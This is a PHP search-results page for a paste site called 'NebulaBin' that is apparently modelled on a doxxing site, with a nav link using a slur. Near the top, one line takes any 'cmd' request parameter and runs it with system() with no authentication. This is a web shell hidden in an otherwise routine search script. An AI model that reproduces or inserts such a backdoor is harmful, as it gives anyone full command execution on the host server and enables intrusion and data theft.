<?php
session_start();
require_once 'config/database.php';
require_once 'includes/premium-functions.php';
if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }

$database = new Database();
$db = $database->getConnection();

// Get search query
$search_query = $_GET['q'] ?? '';
$search_query = trim($search_query);

// Get user count for nav
$user_count_query = "SELECT COUNT(*) as count FROM users";
$user_count_stmt = $db->prepare($user_count_query);
$user_count_stmt->execute();
$user_count = $user_count_stmt->fetch(PDO::FETCH_ASSOC)['count'];

$search_results = [];
$total_results = 0;

if (!empty($search_query)) {
    // Search in pastes (title and content) - Fix the LIMIT issue
    $search_sql = "SELECT p.*, u.username, u.role, u.upgrade_tier, u.custom_color, u.avatar, u.id as user_id
                   FROM pastes p 
                   LEFT JOIN users u ON p.user_id = u.id 
                   WHERE p.is_private = 0 AND p.is_unlisted = 0
                   AND (p.title LIKE ? OR p.content LIKE ? OR u.username LIKE ?)
                   ORDER BY p.created_at DESC 
                   LIMIT 50";
    
    $search_term = "%$search_query%";
    $search_stmt = $db->prepare($search_sql);
    $search_stmt->execute([$search_term, $search_term, $search_term]);
    $search_results = $search_stmt->fetchAll(PDO::FETCH_ASSOC);
    
    // Get total count
    $count_sql = "SELECT COUNT(*) as count
                  FROM pastes p 
                  LEFT JOIN users u ON p.user_id = u.id 
                  WHERE p.is_private = 0 AND p.is_unlisted = 0
                  AND (p.title LIKE ? OR p.content LIKE ? OR u.username LIKE ?)";
    $count_stmt = $db->prepare($count_sql);
    $count_stmt->execute([$search_term, $search_term, $search_term]);
    $total_results = $count_stmt->fetch(PDO::FETCH_ASSOC)['count'];
}

function highlightSearchTerm($text, $search_term) {
    if (empty($search_term)) return htmlspecialchars($text);
    
    $highlighted = preg_replace(
        '/(' . preg_quote($search_term, '/') . ')/i',
        '<mark style="background: #ffff00; color: #000;">$1</mark>',
        htmlspecialchars($text)
    );
    
    return $highlighted;
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Search Results - NebulaBin</title>
    <link rel="stylesheet" href="assets/css/doxbin-style.css">
</head>
<body>
    <header class="header">
        <nav class="nav">
            <a href="home.php" class="logo">NebulaBin</a>
            <ul class="nav-menu">
                <li><a href="home.php">Home</a></li>
                <li><a href="add-paste.php">Add Paste</a></li>
                <li><a href="users.php">Users</a></li>
                <li><a href="upgrades.php">Upgrades</a></li>
                <li><a href="hall-of-autism.php">Hall of Autism</a></li>
                <li><a href="support.php">Support</a></li>
            </ul>
            <div class="nav-right">
                <span class="user-count"><?php echo number_format($user_count); ?></span>
                <?php if (isset($_SESSION['user_id'])): ?>
                    <a href="profile.php?id=<?php echo $_SESSION['user_id']; ?>">Profile</a>
                    <a href="logout.php">Logout</a>
                <?php else: ?>
                    <a href="login.php">Login</a>
                    <a href="register.php">Register</a>
                <?php endif; ?>
            </div>
        </nav>
    </header>

    <div class="container">
        <div class="search-section">
            <label class="search-label">Search for a paste</label>
            <div class="search-container">
                <input type="text" class="search-input" placeholder="Search for..." id="searchInput" 
                       value="<?php echo htmlspecialchars($search_query); ?>">
                <button class="search-btn" onclick="searchPastes()">Search</button>
            </div>
            
            <?php if (!empty($search_query)): ?>
                <div class="results-info">
                    Found <?php echo $total_results; ?> results for "<?php echo htmlspecialchars($search_query); ?>"
                    <a href="home.php" style="color: #4a9eff; margin-left: 15px;">[Back to Home]</a>
                </div>
            <?php else: ?>
                <div class="results-info">Enter a search term to find pastes</div>
            <?php endif; ?>
        </div>

        <?php if (!empty($search_query)): ?>
            <?php if (!empty($search_results)): ?>
                <div class="section-title">Search Results</div>
                <table class="paste-table">
                    <thead>
                        <tr>
                            <th>Title</th>
                            <th>Comments</th>
                            <th>Views</th>
                            <th>Created by</th>
                            <th>Added</th>
                        </tr>
                    </thead>
                    <tbody>
                        <?php foreach ($search_results as $paste): ?>
                        <tr>
                            <td>
                                <a href="view.php?id=<?php echo $paste['id']; ?>">
                                    <?php echo highlightSearchTerm($paste['title'], $search_query); ?>
                                </a>
                            </td>
                            <td>—</td>
                            <td><?php echo number_format($paste['views']); ?></td>
                            <td><?php echo getUsernameWithRole($paste['username'] ?? 'Anonymous', $paste['role'] ?? 'user', $paste['upgrade_tier'] ?? 'none', $paste['custom_color'], $paste['user_id'], $paste['avatar']); ?></td>
                            <td><?php echo date('M j, Y', strtotime($paste['created_at'])); ?></td>
                        </tr>
                        <?php endforeach; ?>
                    </tbody>
                </table>
            <?php else: ?>
                <div style="text-align: center; color: #888; padding: 40px;">
                    <p>No results found for "<?php echo htmlspecialchars($search_query); ?>"</p>
                    <p style="margin-top: 10px; font-size: 14px;">Try different keywords or check your spelling.</p>
                </div>
            <?php endif; ?>
        <?php endif; ?>
    </div>

    <!-- Chat Button -->
    <button class="chat-button">Chat</button>

    <script>
        function searchPastes() {
            const searchTerm = document.getElementById('searchInput').value;
            if (searchTerm.trim()) {
                window.location.href = `search.php?q=${encodeURIComponent(searchTerm)}`;
            } else {
                window.location.href = 'home.php';
            }
        }

        document.getElementById('searchInput').addEventListener('keypress', function(e) {
            if (e.key === 'Enter') {
                searchPastes();
            }
        });
    </script>
</body>
</html>
